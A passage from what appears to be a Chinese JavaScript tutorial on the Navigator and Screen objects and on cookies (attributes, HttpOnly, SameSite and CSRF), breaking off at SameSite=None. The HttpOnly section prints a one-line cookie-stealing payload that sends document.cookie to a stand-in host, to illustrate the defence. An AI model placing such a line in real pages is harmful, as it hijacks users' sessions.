<h4 id="Navigator-geolocation"><a href="#Navigator-geolocation" class="headerlink" title="Navigator.geolocation"></a>Navigator.geolocation</h4><p><code>Navigator.geolocation</code>属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。</p>
<p>Geolocation 对象提供下面三个方法。</p>
<ul>
<li>Geolocation.getCurrentPosition()：得到用户的当前位置</li>
<li>Geolocation.watchPosition()：监听用户位置变化</li>
<li>Geolocation.clearWatch()：取消<code>watchPosition()</code>方法指定的监听函数</li>
</ul>
<p>注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。</p>
<h4 id="Navigator-cookieEnabled"><a href="#Navigator-cookieEnabled" class="headerlink" title="Navigator.cookieEnabled"></a>Navigator.cookieEnabled</h4><p><code>navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.cookieEnabled &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时<code>cookieEnabled</code>返回的还是<code>true</code>。</p>
<h3 id="Navigator-对象的方法"><a href="#Navigator-对象的方法" class="headerlink" title="Navigator 对象的方法"></a>Navigator 对象的方法</h3><h4 id="Navigator-javaEnabled"><a href="#Navigator-javaEnabled" class="headerlink" title="Navigator.javaEnabled()"></a>Navigator.javaEnabled()</h4><p><code>navigator.javaEnabled()</code>方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.javaEnabled() &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-sendBeacon"><a href="#Navigator-sendBeacon" class="headerlink" title="Navigator.sendBeacon()"></a>Navigator.sendBeacon()</h4><p><code>Navigator.sendBeacon()</code>方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。</p>
<h3 id="Navigator-的实验性属性"><a href="#Navigator-的实验性属性" class="headerlink" title="Navigator 的实验性属性"></a>Navigator 的实验性属性</h3><p>Navigator 对象有一些实验性属性，在部分浏览器可用。</p>
<h4 id="Navigator-deviceMemory"><a href="#Navigator-deviceMemory" class="headerlink" title="Navigator.deviceMemory"></a>Navigator.deviceMemory</h4><p><code>navigator.deviceMemory</code>属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。</p>
<p>它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回<code>8</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (navigator.deviceMemory &gt; 1) &#123;</span><br><span class="line">  await import(&#39;.&#x2F;costly-module.js&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面示例中，只有当前内存大于 1GB，才加载大型的脚本。</p>
<h4 id="Navigator-hardwareConcurrency"><a href="#Navigator-hardwareConcurrency" class="headerlink" title="Navigator.hardwareConcurrency"></a>Navigator.hardwareConcurrency</h4><p><code>navigator.hardwareConcurrency</code>属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。</p>
<p>现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (navigator.hardwareConcurrency &gt; 4) &#123;</span><br><span class="line">  await import(&#39;.&#x2F;costly-module.js&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。</p>
<p>该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let workerList &#x3D; [];</span><br><span class="line"></span><br><span class="line">for (let i &#x3D; 0; i &lt; window.navigator.hardwareConcurrency; i++) &#123;</span><br><span class="line">  let newWorker &#x3D; &#123;</span><br><span class="line">    worker: new Worker(&#39;cpuworker.js&#39;),</span><br><span class="line">    inUse: false</span><br><span class="line">  &#125;;</span><br><span class="line">  workerList.push(newWorker);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。</p>
<h4 id="Navigator-connection"><a href="#Navigator-connection" class="headerlink" title="Navigator.connection"></a>Navigator.connection</h4><p><code>navigator.connection</code>属性返回一个对象，包含当前网络连接的相关信息。</p>
<ul>
<li>downlink：有效带宽估计值（单位：兆比特&#x2F;秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。</li>
<li>downlinkMax：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。</li>
<li>effectiveType：返回连接的等效类型，可能的值为<code>slow-2g</code>、<code>2g</code>、<code>3g</code>、<code>4g</code>。</li>
<li>rtt：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。</li>
<li>saveData：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回<code>true</code>或者<code>false</code>。</li>
<li>type：当前连接的介质类型，可能的值为<code>bluetooth</code>、<code>cellular</code>、<code>ethernet</code>、<code>none</code>、<code>wifi</code>、<code>wimax</code>、<code>other</code>、<code>unknown</code>。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (navigator.connection.effectiveType &#x3D;&#x3D;&#x3D; &#39;4g&#39;) &#123;</span><br><span class="line">  await import(&#39;.&#x2F;costly-module.js&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面示例中，如果网络连接是 4G，则加载大型脚本。</p>
<h3 id="Screen-对象"><a href="#Screen-对象" class="headerlink" title="Screen 对象"></a>Screen 对象</h3><p>Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。<code>window.screen</code>属性指向这个对象。</p>
<p>该对象有下面的属性。</p>
<ul>
<li><code>Screen.height</code>：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。</li>
<li><code>Screen.width</code>：浏览器窗口所在的屏幕的宽度（单位像素）。</li>
<li><code>Screen.availHeight</code>：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于<code>height</code>减去那些被系统组件的高度。</li>
<li><code>Screen.availWidth</code>：浏览器窗口可用的屏幕宽度（单位像素）。</li>
<li><code>Screen.pixelDepth</code>：整数，表示屏幕的色彩位数，比如<code>24</code>表示屏幕提供24位色彩。</li>
<li><code>Screen.colorDepth</code>：<code>Screen.pixelDepth</code>的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。</li>
<li><code>Screen.orientation</code>：返回一个对象，表示屏幕的方向。该对象的<code>type</code>属性是一个字符串，表示屏幕的具体方向，<code>landscape-primary</code>表示横放，<code>landscape-secondary</code>表示颠倒的横放，<code>portrait-primary</code>表示竖放，<code>portrait-secondary</code>表示颠倒的竖放。</li>
</ul>
<p>下面是<code>Screen.orientation</code>的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.screen.orientation</span><br><span class="line">&#x2F;&#x2F; &#123; angle: 0, type: &quot;landscape-primary&quot;, onchange: null &#125;</span><br></pre></td></tr></table></figure>

<p>下面的例子保证屏幕分辨率大于 1024 x 768。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.screen.width &gt;&#x3D; 1024 &amp;&amp; window.screen.height &gt;&#x3D; 768) &#123;</span><br><span class="line">  &#x2F;&#x2F; 分辨率不低于 1024x768</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是根据屏幕的宽度，将用户导向不同网页的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((screen.width &lt;&#x3D; 800) &amp;&amp; (screen.height &lt;&#x3D; 600)) &#123;</span><br><span class="line">  window.location.replace(&#39;small.html&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  window.location.replace(&#39;wide.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
<p>HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如<code>id=1234</code>），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。</p>
<p>Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。</p>
<ul>
<li>对话（session）管理：保存登录状态、购物车等需要记录的信息。</li>
<li>个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
<li>追踪用户：记录和分析用户行为。</li>
</ul>
<p>Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。</p>
<p>每个 Cookie 都有以下几方面的元数据。</p>
<ul>
<li>Cookie 的名字</li>
<li>Cookie 的值（真正的数据写在这里面）</li>
<li>到期时间（超过这个时间会失效）</li>
<li>所属域名（默认为当前域名）</li>
<li>生效的路径（默认为当前网址）</li>
</ul>
<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为<code>www.example.com</code>，生效路径为根路径<code>/</code>。</p>
<p>如果 Cookie 的生效路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。</p>
<p>用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.navigator.cookieEnabled &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x2F;&#x2F; &quot;id&#x3D;foo;key&#x3D;bar&quot;</span><br></pre></td></tr></table></figure>

<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
<p>Cookie 是按照域名区分的，<code>foo.com</code>只能读取自己放置的 Cookie，无法读取其他网站（比如<code>bar.com</code>）放置的 Cookie。一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如<code>mydomain.com</code>不能读取<code>subdomain.mydomain.com</code>设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将<code>domain</code>属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name&#x3D;value; domain&#x3D;mydomain.com</span><br></pre></td></tr></table></figure>

<p>上面示例中，设置 Cookie 时，<code>domain</code>属性设为<code>mydomain.com</code>，那么各级的子域名和一级域名都可以读取这个 Cookie。</p>
<p>注意，区分 Cookie 时不考虑协议和端口。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>或<code>http://example.com:8080</code>读取。</p>
<h3 id="Cookie-与-HTTP-协议"><a href="#Cookie-与-HTTP-协议" class="headerlink" title="Cookie 与 HTTP 协议"></a>Cookie 与 HTTP 协议</h3><p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p>
<h4 id="HTTP-回应：Cookie-的生成"><a href="#HTTP-回应：Cookie-的生成" class="headerlink" title="HTTP 回应：Cookie 的生成"></a>HTTP 回应：Cookie 的生成</h4><p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:foo&#x3D;bar</span><br></pre></td></tr></table></figure>

<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK</span><br><span class="line">Content-type: text&#x2F;html</span><br><span class="line">Set-Cookie: yummy_cookie&#x3D;choco</span><br><span class="line">Set-Cookie: tasty_cookie&#x3D;strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>

<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Expires&#x3D;&lt;date&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Max-Age&#x3D;&lt;non-zero-digit&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Domain&#x3D;&lt;domain-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Path&#x3D;&lt;path-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Secure</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; HttpOnly</span><br></pre></td></tr></table></figure>

<p>上面的几个属性的含义，将在后文解释。</p>
<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Domain&#x3D;&lt;domain-value&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value1; domain&#x3D;example.com; path&#x3D;&#x2F;blog</span><br></pre></td></tr></table></figure>

<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value2; domain&#x3D;example.com; path&#x3D;&#x2F;blog</span><br></pre></td></tr></table></figure>

<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value2; domain&#x3D;example.com; path&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>

<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: key1&#x3D;value1; key1&#x3D;value2</span><br></pre></td></tr></table></figure>

<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
<h4 id="HTTP-请求：Cookie-的发送"><a href="#HTTP-请求：Cookie-的发送" class="headerlink" title="HTTP 请求：Cookie 的发送"></a>HTTP 请求：Cookie 的发送</h4><p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: foo&#x3D;bar</span><br></pre></td></tr></table></figure>

<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name&#x3D;value; name2&#x3D;value2; name3&#x3D;value3</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;sample_page.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie&#x3D;choco; tasty_cookie&#x3D;strawberry</span><br></pre></td></tr></table></figure>

<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
<ul>
<li>Cookie 的各种属性，比如何时过期。</li>
<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
</ul>
<h3 id="Cookie-的属性"><a href="#Cookie-的属性" class="headerlink" title="Cookie 的属性"></a>Cookie 的属性</h3><h4 id="Expires，Max-Age"><a href="#Expires，Max-Age" class="headerlink" title="Expires，Max-Age"></a>Expires，Max-Age</h4><p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>

<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
<h4 id="Domain，Path"><a href="#Domain，Path" class="headerlink" title="Domain，Path"></a>Domain，Path</h4><p><code>Domain</code>属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。</p>
<p>服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。</p>
<p>如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。</p>
<p>举例来说，当前域名为<code>x.y.z.com</code>，那么 Domain 属性可以设为<code>x.y.z.com</code>，或者<code>y.z.com</code>，或者<code>z.com</code>，但不能设为<code>foo.x.y.z.com</code>，或者<code>another.domain.com</code>。</p>
<p>另一个例子是，当前域名为<code>wangdoc.github.io</code>，则 Domain 属性只能设为<code>wangdoc.github.io</code>，不能设为<code>github.io</code>，因为后者是一个公共域名。</p>
<p>浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是<code>y.z.com</code>，那么适用于<code>y.z.com</code>、<code>x.y.z.com</code>、<code>foo.x.y.z.com</code>等域名。再比如，Domain 属性是公共域名<code>github.io</code>，那么只适用于<code>github.io</code>这个域名本身，不适用于它的子域名<code>wangdoc.github.io</code>。</p>
<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>Path</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。</p>
<h4 id="Secure，HttpOnly"><a href="#Secure，HttpOnly" class="headerlink" title="Secure，HttpOnly"></a>Secure，HttpOnly</h4><p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src &#x3D; &quot;http:&#x2F;&#x2F;www.evil-domain.com&#x2F;steal-cookie.php?cookie&#x3D;&quot; + document.cookie;</span><br></pre></td></tr></table></figure>

<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
<h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>Chrome 51 开始，浏览器的 Cookie 新增加了一个<code>SameSite</code>属性，用来防止 CSRF 攻击和用户追踪。</p>
<p>Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站<code>your-bank.com</code>，银行服务器发来了一个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:id&#x3D;a3fWa;</span><br></pre></td></tr></table></figure>

<p>用户后来又访问了恶意网站<code>malicious.com</code>，上面有一个表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;your-bank.com&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;your-bank.com&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;dad3weg34&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;facebook.com&quot; style&#x3D;&quot;visibility:hidden;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。</p>
<p>Cookie 的<code>SameSite</code>属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。</p>
<blockquote>
<ul>
<li>Strict</li>
<li>Lax</li>
<li>None</li>
</ul>
</blockquote>
<p><strong>（1）Strict</strong></p>
<p><code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName&#x3D;CookieValue; SameSite&#x3D;Strict;</span><br></pre></td></tr></table></figure>

<p>这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p>
<p><strong>（2）Lax</strong></p>
<p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName&#x3D;CookieValue; SameSite&#x3D;Lax;</span><br></pre></td></tr></table></figure>

<p>导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。</p>
<table>
<thead>
<tr>
<th>请求类型</th>
<th align="center">示例</th>
<th align="right">正常情况</th>
<th>Lax</th>
</tr>
</thead>
<tbody><tr>
<td>链接</td>
<td align="center"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td>
<td align="right">发送 Cookie</td>
<td>发送 Cookie</td>
</tr>
<tr>
<td>预加载</td>
<td align="center"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td>
<td align="right">发送 Cookie</td>
<td>发送 Cookie</td>
</tr>
<tr>
<td>GET 表单</td>
<td align="center"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td>
<td align="right">发送 Cookie</td>
<td>发送 Cookie</td>
</tr>
<tr>
<td>POST 表单</td>
<td align="center"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td>
<td align="right">发送 Cookie</td>
<td>不发送</td>
</tr>
<tr>
<td>iframe</td>
<td align="center"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td>
<td align="right">发送 Cookie</td>
<td>不发送</td>
</tr>
<tr>
<td>AJAX</td>
<td align="center"><code>$.get(&quot;...&quot;)</code></td>
<td align="right">发送 Cookie</td>
<td>不发送</td>
</tr>
<tr>
<td>Image</td>
<td align="center"><code>&lt;img src=&quot;...&quot;&gt;</code></td>
<td align="right">发送 Cookie</td>
<td>不发送</td>
</tr>
</tbody></table>
<p>设置了<code>Strict</code>或<code>Lax</code>以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。</p>
<p><strong>（3）None</strong></p>
